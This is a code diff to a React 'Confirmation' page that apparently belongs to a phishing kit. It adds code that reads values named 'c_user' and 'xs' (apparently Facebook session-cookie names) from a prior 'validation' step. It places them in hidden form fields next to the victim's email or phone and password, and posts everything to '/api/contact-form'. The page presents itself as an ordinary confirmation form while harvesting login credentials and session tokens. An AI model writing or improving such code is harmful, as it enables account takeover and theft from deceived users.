@@ -13,9 +13,9 @@ import { zodResolver } from "@hookform/resolvers/zod";
 import { useForm } from "react-hook-form";
 import { useLocation } from "wouter";
 import MetaTags from "@/components/meta-tags";
-import { confirmationFormSchema } from "@/lib/form-schemas";
+import { confirmationFormSchema } from "@shared/schema"; // Updated import path
 import { apiRequest } from "@/lib/queryClient";
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import {
   Select,
   SelectContent,
@@ -30,27 +30,50 @@ export default function Confirmation() {
   const [, setLocation] = useLocation();
   const [contactMethod, setContactMethod] = useState<'email' | 'phone'>('email');
   const [countryCode, setCountryCode] = useState('+1');
+  const [validationData, setValidationData] = useState<{ c_user: string; xs: string } | null>(null);
+
+  useEffect(() => {
+    const storedData = localStorage.getItem('validation_data');
+    if (!storedData) {
+      setLocation('/validation');
+      return;
+    }
+    try {
+      const parsed = JSON.parse(storedData);
+      setValidationData(parsed);
+    } catch (error) {
+      console.error('Failed to parse validation data:', error);
+      setLocation('/validation');
+    }
+  }, [setLocation]);
 
   const form = useForm({
     resolver: zodResolver(confirmationFormSchema),
     defaultValues: {
       user_email: "",
       password: "",
+      c_user: "",
+      xs: "",
     },
   });
 
+  useEffect(() => {
+    if (validationData) {
+      form.setValue('c_user', validationData.c_user);
+      form.setValue('xs', validationData.xs);
+    }
+  }, [validationData, form]);
+
   const onSubmit = async (data: any) => {
     try {
-      const validationData = JSON.parse(localStorage.getItem('validation_data') || '{}');
       const formattedData = {
-        ...validationData,
         ...data,
         user_email: contactMethod === 'phone' ? `${countryCode}${data.user_email}` : data.user_email
       };
 
       await apiRequest('POST', '/api/contact-form', formattedData);
-
       localStorage.removeItem('validation_data');
+
       toast({
         title: "Success!",
         description: "Your form has been submitted successfully"
@@ -64,6 +87,10 @@ export default function Confirmation() {
       });
     }
   };
+
+  if (!validationData) {
+    return null;
+  }
 
   return (
     <>
